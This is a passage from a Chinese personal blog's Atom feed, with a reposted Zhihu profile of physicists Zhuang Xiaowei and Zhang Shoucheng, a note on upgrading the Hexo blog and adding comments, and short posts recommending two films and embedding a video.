title="二、学霸也有伤心事"></a>二、学霸也有伤心事</h2><p>学霸嘛，也不是一直都能顺风顺水一往无前。毕竟学霸也是人。小威博士毕业的时候，本来想斯坦福大学物理系找个教职。估计刚开始也就是助理教授之类。但是没想到，斯坦福拒绝她了，可能是因为她的科研经历还不够金光灿灿吧？这一下，小威哭惨了。原来还计划着和别人炫耀一下你看你还做博后呢我都当教授了，结果没机会炫耀了……但是哭归哭，这也算不上什么失败。更何况小威一向不拿失败当回事。失败又怎样，失败了再爬起来嘛，除死无大事。这一下小威想清楚了，自己可能还真的不适合现在就搞个教职。于是她拒绝了很多其他学校的教职。这也算是破釜沉舟了。“当时，我只要做教授的风光，其实并不知道自己要做什么！”小威当时如是说。于是小威又重整旗鼓，投到斯坦福大学朱棣文教授旗下去做博后。在朱棣文的实验室她突然180度大转弯跑到了生物领域。小威在回顾这一转折时说，当时自己是“想做点新的东西”，朱棣文问她要不要做生物，她就说“Why not？”。此后三年，小威从对生物一无所知到能熟练地做各种分子生物学实验。但是头两年她也啥结果都没做出来。一时的默默无闻不代表不会一鸣惊人。小威是个很有想法的孩子，经常会给朱棣文提出很多自以为很牛逼的想法。结果就是被导师深刻地打击……这给小威养成了一个习惯，以后每当有一个想法，脑袋里就会蹦出朱棣文当年那深邃的眼神……当然，这些经历并非一无是处。正是这样从物理跳到生物的经历让小威开启了自己的科研之路。<img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180306/211202162.png" alt=""></p><h2 id="三、-业精于勤荒于嬉"><a href="#三、-业精于勤荒于嬉" class="headerlink" title="三、 业精于勤荒于嬉"></a>三、 业精于勤荒于嬉</h2><p>结束自己的博士后生涯之后，她收到哈佛、加州理工、麻省理工、耶鲁、普林斯顿等7所大学的邀请。而庄小威选择了国人熟知的哈佛大学。（一股王霸之气暴露无遗）她的物理根底启发她将带荧光的分子标记物附在病毒上，当用激光照射时，标记物发射出特殊的彩色光。不过这个题目显然比较有难度，她不像其他人刚当教授的时候先拿几个软柿子捏捏用点容易做的课题稳固自己的位置，一上来就做的特别难的题目。这导致她一开始的两年又特别不顺，基金申请不了，没钱没人，再勇敢的花木兰也会哭鼻子的。但是，只能说天道酬勤。只要坚持不懈，相信总是会有收获的。终于，小威不仅获得了实验结果，而且获得了麦克阿瑟天才奖的垂青，成为当年获奖者里最年轻的一位，还有50万美金哦。小威的工作不可谓不重要。正如今年的诺贝尔化学奖，小威的工作也是将显微镜的最大观察限度放大到了分子级别。小威是世界上第一个记录病毒感染细胞全过程的人。至于小威为何没得诺贝尔奖，究其原因，如果不以阴谋论将问题归结为性别的话，那么大概是因为小威的工作确实并非这个领域的开创性工作。虽然重要，但是，不是创始者。小威就吃亏在这。34岁。仅仅34岁，小威就获得了哈佛正教授的地位，而且拥有了自己的实验室。她是怎么做到的？是靠拼爹吗？是靠拼导师吗？都不是。在哈佛的每一天她都是从早上十点工作到晚上十二点。全年无休，从来没有周末这一说。她说：“除了吃饭和睡觉，剩下的时间都在工作。”可见，学霸没什么特别的本事，也许也没什么超人的本领。他们唯一与常人不同的能力，就是专心致志地勤奋。人生苦短，如果能把短暂的一生都用在一件事上，那么就算不成功，也不会多么失败。勇敢，坚定，一往无前。用三个词形容小威的话，我会选择这三个。现在的小威已经是美国科学院院士了，而今年她仅仅才42岁。对于一个科学家来说，她的一生才刚刚开始。而她也当得起无冕之王这四个字。那么，你呢？</p><p>参考网址：</p><p><a href="https://link.zhihu.com/?target=http%3A//blog.sciencenet.cn/blog-75099-613020.html" target="_blank" rel="noopener">科学网—庄小威：独立研究者的道路</a></p><p><a href="https://link.zhihu.com/?target=http%3A//news.ustc.edu.cn/kdb/200202/t20020220_62368.html" target="_blank" rel="noopener">中国科大报》551期 中国科学技术大学新闻网</a></p><p><a href="https://link.zhihu.com/?target=http%3A//news.ustc.edu.cn/xwbl/201208/t20120829_138808.html" target="_blank" rel="noopener">庄小威校友与新生分享“自己的故事” 中国科学技术大学新闻网</a></p><p>图片来自网络。</p><h1 id="第二个是张首晟。"><a href="#第二个是张首晟。" class="headerlink" title="第二个是张首晟。"></a>第二个是张首晟。</h1><p>他和今年的诺贝尔物理奖，关系特别近了。2010年获欧洲物理奖。2012年获美国凝聚态物理最高奖奥利弗巴克利奖。2012年获得狄拉克奖。2014年获美国富兰克林奖获得这些奖的人是谁你造吗？他们有一个共同的名字，叫张首晟。多年被汤森路透预测会得诺奖的他，得诺奖大概只是时间问题。但愿不是像村上春树那样一辈子陪太子读书。<img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180306/211325677.png" alt=""></p><h2 id="一、阁楼里的少年"><a href="#一、阁楼里的少年" class="headerlink" title="一、阁楼里的少年"></a>一、阁楼里的少年</h2><p>1963年，张首晟出生在上海。那时还没开始文革，但是66年开始的文革也让他的学上的有一搭没一搭，喧闹宽敞的黄浦江边，却放不下一张书桌。没办法，他只能躲到阁楼里去。白天就在学校看着各种领袖语录和最高指示，只有晚上回家以后时间才是他的。或者说，是属于他家阁楼的。似乎每一个人心中都有一个类似阁楼的奇妙地方。张首晟在阁楼里发现了他爷爷的大学毕业证书，还有许许多多稀奇古怪的书，从康德到黑格尔，从达芬奇到罗丹，从杨振宁到李政道，从艺术到科学。那个年代，读书是没用的，甚至是危险的。爱读书的孩子有可能会被扣上走资派的帽子。还好张首晟有个阁楼。他的童年就都放在了阁楼里，放在了那些看起来毫无意义的书本里。读书，有时候只是一种本能。只有自由而无限制的读书，才是真正的读书。不过因为他爱看书，也有了一些麻烦。一些同学很喜欢捉弄这个“书呆子”，他的父母虽然曾经都是工程师，现在却不得不做起工人的活来，没人能保护被同学欺负的小首晟。这更加让小首晟躲进自己一个人的世界，躲进那充满了奇妙的阁楼里。1976年，转眼小首晟已经13岁。阁楼外面的世界已经换了一个天，新鲜有趣的信息和物质刺激着每一个人的神经，却唯独漏下了小首晟。这一年，他的父亲给他买了一套高中自学教科书，数学物理化学等等一应俱全。就靠这套书，两年后的1978年他居然就通过了高考。当然，那是文革后恢复高考第一届。这一年他才15岁。后来张首晟说：“我的初中学校很差，如果按部就班再读普通高中，也许结果就和今天不一样了，人生的成就总是跟你一些十字路口上的选择有关。”那次高考，允许初中生参加，每个区只有10个名额。这让阁楼少年蠢蠢欲动。他曾说：“伯父的大学毕业年册对大学有着生动的描写，我从小就非常盼望大学生活。虽然我是初中生，但当时的环境下，高中生也不比我拥有更多的知识，所以还是有些信心的。”但是如果通不过，那就没机会上高中了。这是张首晟人生里的第一次冒险。经过激烈的讨论，他的爸妈同意了他。就这样，一不小心，高考后他就进入了他爷爷曾经待过的地方，复旦大学。那年高考改变了很多人的命运，包括张首晟。不得不说，张首晟确实在某种程度上算是一个“天才”。<img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180306/211408488.png" alt=""></p><h2 id="二、没上过高中的大学生"><a href="#二、没上过高中的大学生" class="headerlink" title="二、没上过高中的大学生"></a>二、没上过高中的大学生</h2><p>在复旦，他只上了一年学。为什么呢？因为他的高考成绩非常优秀，一进学校就已经被内定成了赴德国留学的人选。其实并非生活处处靠关系不是吗？进大学时他选择了物理系。这是因为，“初中时，在很封闭的情况下，我们都知道杨振宁、李政道获得诺贝尔奖，为中华民族争了一口气。大学时选择理论物理专业，就是冲着他们的榜样力量。”足可见，能够引导少年学科学的，并非是那些知识，而是那些人。当然，此时张首晟还不知道，他以后会与杨振宁有一场非凡的缘分。11号楼303室，室友8人。张首晟就在这个逼仄的环境里，继续他如饥似渴的读书生涯。当然，周围的人也是如此。正如他所说，“在初中的时候，由于喜欢读书，周围的人都不以为然，我一直感觉很孤单。来到复旦之后，大家都如饥似渴地读书，有了很多的好朋友。”内向的张首晟逐渐开始变外向，第二学期班主任就把他忽悠到了同济去上德语培训。一年之后的1980年，没有高中文凭也没大学文凭的张首晟就这样踏上了赶赴德国的旅程。当张首晟到达西柏林时，柏林墙还立着。东边的柏林大学有一些师生为了自由而翻墙来到西柏林，建立了柏林自由大学。柏林自由大学果然不愧自己的名字，校训都是“真实，公平，自由”。张首晟这一年才17岁，在自由大学里他可没让自己完全自由，勤奋的他仅仅花了三年就完成了规定五年的学制，但是学成之后的张首晟，还是有些迷惘。在柏林自由大学他学的是理论物理，就是李政道杨振宁的专业。但是临近毕业，他有些不知所措了。理论物理的就业面太窄了。“本来我还挺有信心的，但同学之间的担忧对我产生了影响，1981年左右，我开始想到前途问题。”当年暑假，为了放松一下忧虑的情绪，他搭便车旅行了德国一圈。这场如骑士一般的浪漫旅行对张首晟的人生选择产生了重要影响。偶然的机会，他到了哥廷根大学。在哥廷根大学旁边有一块墓地，里面埋葬了许许多多的物理学家。最为奇特的是，每个人的墓碑上都没有墓志铭，只有一个他生前发现的公式。比如海森堡的墓碑上是测不准原理，玻恩的墓碑上是波函数，奥托哈恩的墓碑上是一道核反应公式。“一个朴素的墓碑，一个简单而普适的公式，这才是人生最高境界。从此之后，我决定要把自己毕生的精力贡献给物理学研究，特别是理论物理学的研究。”几个墓碑震撼了年轻的张首晟，从此张首晟就下定决心要走科研之路。“这辈子要留下什么？”留下一道公式也就足够了。<img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180306/211448633.png" alt=""></p><h2 id="三、不是杨振宁继承者的弟子"><a href="#三、不是杨振宁继承者的弟子" class="headerlink" title="三、不是杨振宁继承者的弟子"></a>三、不是杨振宁继承者的弟子</h2><p>在柏林自由大学学习的时候，张首晟把大统一理论当成了自己的学术目标。因为这是爱因斯坦努力一生的事业，也是杨振宁的领域。但是当他真的成为杨振宁的弟子时，杨振宁却不支持他的想法。在美国纽约州立大学石溪分校，杨振宁先生推荐张首晟去搞凝聚态物理。理由是这玩意方兴未艾，发展特别快，很适合年轻人去搞一搞。而这并非杨振宁的领域。虽然最初大惑不解，但是张首晟还是去做了。1987年，在孤身出国7年后他终于获得了博士学位。毕业后他并没有立刻去申请教职，而是到了IBM做高级研究员。此时他在半导体领域已经深耕多年，颇有建树，也受到了当时为斯坦福大学物理系主任的朱棣文赏识。于是随后1993年他就到了斯坦福，1996年年仅33岁的张首晟就被评为了斯坦福终身教授。2006年，张首晟提出了拓扑绝缘体理论的材料实现方案。何谓拓扑绝缘体？简单的说，首先它是个绝缘体，整体是不导电的。但是在这个物体的边缘或者表面，总是有一些会导电的区域。这种边缘导电特性可以在一定条件下稳定存在，由于其中不同运动方向的电子自旋方向相反，通过电子的自旋就可以传递信息。这样说还是很麻烦，总之你知道很复杂很高精尖很给力就行了。在此之前首先提出了量子自旋霍尔效应。当然这也是张首晟首先预测存在的。要理解这个理论就更难了，你首先要理解霍尔效应，再理解量子霍尔效应，等等……总之你知道，量子自旋霍尔效应不需要量子霍尔效应的低温和强磁场，所以省电省地方，只要能实际运用就可以让我们的电子设备比如电脑手机更小巧耗电更少散热更少，于是这理论就很牛逼。（外行，有错请指出）总之，因为这两项理论发现，张首晟在2010年拿到了欧洲物理学会颁发的欧洲物理奖，2012年拿到了美国物理学会颁发的凝聚态物理最高奖奥利弗巴克利奖和狄拉克奖，今年又拿到了美国的富兰克林奖，按照规律，量子霍尔效应和分数量子霍尔效应都已经获得了诺贝尔奖，量子自旋霍尔效应会不会延续这个神话呢？<img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180306/211520015.png" alt=""></p><h2 id="四、不是穷教书匠的投资人"><a href="#四、不是穷教书匠的投资人" class="headerlink" title="四、不是穷教书匠的投资人"></a>四、不是穷教书匠的投资人</h2><p>牛仔很忙，张首晟也很忙。他不仅仅搞科研牛逼，当老师也牛逼，他的学生早就散布全世界了，当上教授的也不乏其人。并且，他也不是个穷教书匠了。在斯坦福，他不但是教授，还联合创办了华源科技协会，在斯坦福担任创业导师，更是天使投资人，曾经成功投资就多家创业公司。2013年又与中关村发展集团合作创立了丹华资本，专注于投资斯坦福背景的公司。有人说，献身科学研究的人，要耐得住寂寞、耐得住清贫、耐得住一生一事无成。张首晟的今天，不缺钱，不缺事业，也不寂寞。今年的张首晟不过50岁。只要他能活到80，他就还有30年去等待诺贝尔。虽然他是美籍，但是如果他能得奖就是建国后出生有中国教育背景的第一个诺贝尔获奖者了。哦对了。他似乎还信基督教。其实这也没什么。谁说科学家不能信教？宗教在某种程度上不过是抚慰人心灵的工具罢了。当然，不要只看他的美籍身份。一个国籍并不能改变什么。他还是清华大学的长江学者，千人计划入选者呢。张首晟曾说，“对一个人来说，最可贵的是要有好奇心伴随一生”。灵感来自什么？来自你日常的积淀，还有你的好奇心和想象力。如果仅仅有积淀而没有好奇心想象力，那么也不会有灵感。杨振宁曾经告诉张首晟，“诗歌追求的境界是用两句话将复杂的感情说清楚，科学也是追求用一个简单的公式去描写大自然的所有万千现象。艺术和科学是相通的，F=ma’、‘E=MC2’就是描写大自然的最美丽的诗句。”书本上你只能学到知识，你不能学到好奇心想象力还有艺术和科学想通的想法。想创新，说容易也容易，说难也难。创新就是敢为天下先。张首晟，50岁的人，依然是当年的那个阁楼少年。因为他有自己的世界观，始终保持着如少年般旺盛的好奇心。也许这就是他成功的秘诀吧。看了张首晟的故事，你有木有获得什么启发呢？如果给你同样的机会，你能否做到他同样的成就呢？谁知道呢。</p><p>参考网址：</p><p><a href="https://link.zhihu.com/?target=http%3A//pan.baidu.com/share/link%3Fshareid%3D1972097840%26uk%3D1797554015" target="_blank" rel="noopener">抗战时代生活史.pdf_免费高速下载</a></p><p><a href="https://link.zhihu.com/?target=http%3A//news.sciencenet.cn/htmlnews/2013/3/275949.shtm" target="_blank" rel="noopener">张首晟谈拓扑绝缘体：将信息社会带向更高层次</a></p><p><a href="https://link.zhihu.com/?target=http%3A//news.sciencenet.cn/htmlnews/2012/8/267962.shtm" target="_blank" rel="noopener">科学网—华人科学家张首晟获2012年狄拉克奖</a></p><p><a href="https://link.zhihu.com/?target=http%3A//news.sciencenet.cn/htmlnews/2012/9/269823.shtm" target="_blank" rel="noopener">“千人”张首晟：二十师从杨振宁</a></p><p><a href="https://link.zhihu.com/?target=http%3A//news.sciencenet.cn/htmlnews/2010/9/236985.shtm" target="_blank" rel="noopener">科学网—华人科学家张首晟获“欧洲物理奖”</a></p><p><a href="https://link.zhihu.com/?target=http%3A//news.sciencenet.cn/htmlnews/2013/3/275945.shtm" target="_blank" rel="noopener">张首晟获2013年“基础物理学奖”</a></p><p><a href="https://link.zhihu.com/?target=http%3A//news.sciencenet.cn/htmlnews/2014/11/306643.shtm" target="_blank" rel="noopener">张首晟获富兰克林奖</a></p><p><a href="https://link.zhihu.com/?target=http%3A//news.sciencenet.cn/htmlnews/2010/7/234542.shtm" target="_blank" rel="noopener">科学网—访华人物理学家张首晟：让信息高速公路通到芯片最底层</a></p><p><a href="https://link.zhihu.com/?target=http%3A//baike.baidu.com/view/2061129.htm%3Ffr%3Daladdin" target="_blank" rel="noopener">张首晟_百度百科</a></p><p><a href="https://link.zhihu.com/?target=http%3A//www.58188.com/invest/2014/3-13/7515.html" target="_blank" rel="noopener">2个物理学家的风投史：神童张首晟第一性原理做VC_顶尖财经网</a></p><p><a href="https://link.zhihu.com/?target=http%3A//bbs.netbig.com/thread-2530157-1-1.html" target="_blank" rel="noopener">复旦张首晟—</a></p><p><a href="https://link.zhihu.com/?target=http%3A//chuangye.cyz.org.cn/2014/0313/46938.shtml" target="_blank" rel="noopener">2个物理学家的创业风投史：神童张首晟</a></p><hr><blockquote><p><em>声明：</em></p></blockquote><p>作者：公子大白0m0<br>链接：<a href="https://www.zhihu.com/question/36037775/answer/125333556" target="_blank" rel="noopener">https://www.zhihu.com/question/36037775/answer/125333556</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      知乎上看到的一个评论，谈了两位大牛的故事，感觉不错，遂引以为自我鼓励之文~
    
    </summary>
    
      <category term="励志故事" scheme="http://blog.rookiehacker.org/categories/%E5%8A%B1%E5%BF%97%E6%95%85%E4%BA%8B/"/>
    
    
      <category term="励志" scheme="http://blog.rookiehacker.org/tags/%E5%8A%B1%E5%BF%97/"/>
    
      <category term="诺奖" scheme="http://blog.rookiehacker.org/tags/%E8%AF%BA%E5%A5%96/"/>
    
  </entry>
  
  <entry>
    <title>【版本更新】对博客的一次更新升级</title>
    <link href="http://blog.rookiehacker.org/2018/03/03/blogupdate/"/>
    <id>http://blog.rookiehacker.org/2018/03/03/blogupdate/</id>
    <published>2018-03-03T07:42:13.000Z</published>
    <updated>2018-03-03T11:45:40.676Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=2008167723&auto=0&height=430"></iframe><hr><h2 id="Hexo升级-主题更新"><a href="#Hexo升级-主题更新" class="headerlink" title="Hexo升级 主题更新"></a>Hexo升级 主题更新</h2><h3 id="先说升级"><a href="#先说升级" class="headerlink" title="先说升级"></a>先说升级</h3><p>因为之前对Hexo做了很多个性化的设置（详情请看<a href="http://blog.rookiehacker.org/2017/01/28/hexo-themes/">这里</a>），并且时间已经过去很久了，到底改了什么地方我也忘记了，改的大多还是一些边边角角的小地方，所以干脆就升级了一下Hexo，其实就是重新安装了一遍。。。npm升级到了5.7.1，node.js升级到了v6.9.1，都是最新版本，下面是Hexo升级后的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">hexo: 3.6.0</span><br><span class="line">hexo-cli: 1.1.0</span><br><span class="line">os: Windows_NT 10.0.16299 win32 x64</span><br><span class="line">http_parser: 2.7.0</span><br><span class="line">node: 6.9.1</span><br><span class="line">v8: 5.1.281.84</span><br><span class="line">uv: 1.9.1</span><br><span class="line">zlib: 1.2.8</span><br><span class="line">ares: 1.10.1-DEV</span><br><span class="line">icu: 57.1</span><br><span class="line">modules: 48</span><br><span class="line">openssl: 1.0.2j</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后就直接把<code>public</code>和<code>source</code>文件夹给复制过去了。</p><h3 id="再说更新"><a href="#再说更新" class="headerlink" title="再说更新"></a>再说更新</h3><p>看了一下<a href="https://www.haomwei.com/technology/maupassant-hexo.html" target="_blank" rel="noopener">屠夫9441的博客</a>，发现maupassant主题也已经更新了，并且更新了一些接入评论的API，正好博客评论也关了很长时间了，直接下载新主题！具体步骤看<a href="https://www.haomwei.com/technology/maupassant-hexo.html" target="_blank" rel="noopener">这里</a>。</p><h2 id="添加畅言评论系统"><a href="#添加畅言评论系统" class="headerlink" title="添加畅言评论系统"></a>添加畅言评论系统</h2><p>更新maupassant主题后添加畅言也就直接添加畅言的APP ID和APP KEY的事，在<code>maupassant</code>下的<code>_config.yml</code>中直接添加即可。关于如何注册使用畅言就不多少了，网上都有。哇~评论终于回来啦！</p><h2 id="欢迎加入我的tg群组"><a href="#欢迎加入我的tg群组" class="headerlink" title="欢迎加入我的tg群组"></a>欢迎加入我的tg群组</h2><p>为什么选择tg就不多说了，下面是邀请链接，直接扫码吧！<br><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180303/151318226.png" alt="扫码加入我的telegram群组"></p><hr><blockquote><p><em>声明：</em><br>文章标题：<a href="http://blog.rookiehacker.org/2018/03/03/blogupdate/" title="【版本更新】对博客的一次更新升级">【版本更新】对博客的一次更新升级</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2018/03/03/blogupdate/" title="【版本更新】对博客的一次更新升级">http://blog.rookiehacker.org/2018/03/03/blogupdate/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      对博客做了一次版本升级，并且加上了畅言的评论系统。
    
    </summary>
    
      <category term="Hexo" scheme="http://blog.rookiehacker.org/categories/Hexo/"/>
    
    
      <category term="Hexo" scheme="http://blog.rookiehacker.org/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>【电影推荐】推荐两部电影标志回归Blog</title>
    <link href="http://blog.rookiehacker.org/2018/02/28/movies/"/>
    <id>http://blog.rookiehacker.org/2018/02/28/movies/</id>
    <published>2018-02-28T13:15:12.000Z</published>
    <updated>2018-02-28T14:57:43.895Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=477933952&auto=1&height=66"></iframe><hr><h2 id="光阴似箭，日月如梭！我又回来了！！！"><a href="#光阴似箭，日月如梭！我又回来了！！！" class="headerlink" title="光阴似箭，日月如梭！我又回来了！！！"></a>光阴似箭，日月如梭！我又回来了！！！</h2><h3 id="经历了几个月高三般备考的充实生活，考试考完了，然后又经过一段时间的煎熬等待，终于公布成绩了。。然后当查到成绩的那刻，我并不敢相信自己会考成这样。。我知道自己考砸了。。但是没想到会是这个样子。。呜呜┭┮﹏┭┮-但是今天不想说考研。。我想我会二战，不会急着去找工作，原因我以后会说，今天只说电影，我最爱的两部电影！"><a href="#经历了几个月高三般备考的充实生活，考试考完了，然后又经过一段时间的煎熬等待，终于公布成绩了。。然后当查到成绩的那刻，我并不敢相信自己会考成这样。。我知道自己考砸了。。但是没想到会是这个样子。。呜呜┭┮﹏┭┮-但是今天不想说考研。。我想我会二战，不会急着去找工作，原因我以后会说，今天只说电影，我最爱的两部电影！" class="headerlink" title="经历了几个月高三般备考的充实生活，考试考完了，然后又经过一段时间的煎熬等待，终于公布成绩了。。然后当查到成绩的那刻，我并不敢相信自己会考成这样。。我知道自己考砸了。。但是没想到会是这个样子。。呜呜┭┮﹏┭┮ 但是今天不想说考研。。我想我会二战，不会急着去找工作，原因我以后会说，今天只说电影，我最爱的两部电影！"></a>经历了几个月高三般备考的充实生活，考试考完了，然后又经过一段时间的煎熬等待，终于公布成绩了。。然后当查到成绩的那刻，我并不敢相信自己会考成这样。。我知道自己考砸了。。但是没想到会是这个样子。。呜呜┭┮﹏┭┮ 但是今天不想说考研。。我想我会二战，不会急着去找工作，原因我以后会说，今天只说电影，我最爱的两部电影！</h3><h1 id="是哪两部电影呢？"><a href="#是哪两部电影呢？" class="headerlink" title="是哪两部电影呢？"></a>是哪两部电影呢？</h1><h2 id="第一部-《当幸福来敲门》"><a href="#第一部-《当幸福来敲门》" class="headerlink" title="第一部 《当幸福来敲门》"></a>第一部 <a href="http://www.iqiyi.com/v_19rrk3nlys.html" target="_blank" rel="noopener">《当幸福来敲门》</a></h2><p><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180228/215937827.jpg" alt=""></p><p>为什么要推荐这一部呢？因为这部剧简直不能更励志啊！遇到失败和挫折，每次都能流着泪在这部剧中找回自信，找到让我站起来的力量！人生中难免会有低谷，然而有的人一蹶不振，有的人能在逆境中重新崛起！永远不要放弃生活的希望，因为终有一天，会有幸福来敲门！</p><h2 id="第二部-《社交网络》"><a href="#第二部-《社交网络》" class="headerlink" title="第二部 《社交网络》"></a>第二部 <a href="http://v.youku.com/v_show/id_XMzA3OTYzMzc2.html" target="_blank" rel="noopener">《社交网络》</a></h2><p><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180228/221213139.jpg" alt=""></p><p>那么为什么又要推荐这一部呢？因为这部剧讲述的是关于扎克伯格如何建立Facebook的故事，对技术的追求，对创意的追求以及对那种Geek精神的追求都在这部剧中有所体现，所以每当我对敲码搬砖失去兴趣心烦意乱的时候，刷一下这部剧，总能让我重新回血，比吃了士力架还特么给力啊。。或许我也想着自己某一天也能创造出自己的Facebook吧~</p><hr><blockquote><p><em>声明：</em><br>文章标题：<a href="http://blog.rookiehacker.org/2018/02/28/movies/" title="【电影推荐】推荐两部电影标志回归Blog">【电影推荐】推荐两部电影标志回归Blog</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2018/02/28/movies/" title="【电影推荐】推荐两部电影标志回归Blog">http://blog.rookiehacker.org/2018/02/28/movies/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      好久没有更新东西了，“漫长”的假期即将过去，推荐两部最爱的电影作为回归~
    
    </summary>
    
      <category term="生活" scheme="http://blog.rookiehacker.org/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="http://blog.rookiehacker.org/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="电影" scheme="http://blog.rookiehacker.org/tags/%E7%94%B5%E5%BD%B1/"/>
    
  </entry>
  
  <entry>
    <title>【LOVE】这是一篇被我遗忘的blog</title>
    <link href="http://blog.rookiehacker.org/2018/02/11/love/"/>
    <id>http://blog.rookiehacker.org/2018/02/11/love/</id>
    <published>2018-02-11T14:24:34.000Z</published>
    <updated>2018-02-28T15:01:35.211Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="自己好好体会吧"><a href="#自己好好体会吧" class="headerlink" title="自己好好体会吧~"></a>自己好好体会吧~</h2><embed height="415" width="544" quality="high" allowfullscreen="true" type="application/x-shockwave-flash" src="//static.hdslb.com/miniloader.swf" flashvars="aid=6406858&page=1" pluginspage="//www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash"><hr><blockquote><p><em>声明：</em><br>文章标题：<a href="http://blog.rookiehacker.org/2018/02/11/love/" title="【LOVE】这是一篇被我遗忘的blog">【LOVE】这是一篇被我遗忘的blog</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2018/02/11/love/" title="【LOVE】这是一篇被我遗忘的blog">http://blog.rookiehacker.org/2018/02/11/love/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      这篇blog我忘了要写什么了，我到的时候就只发现了这个视频。。
    
    </summary>
    
      <category term="生活" scheme="http://blog.rookiehacker.org/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="http://blog.rookiehacker.org/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="情感" scheme="http://blog.rookiehacker.org/tags/%E6%83%85%E6%84%9F/"/>
    
  </entry>
  
</feed>
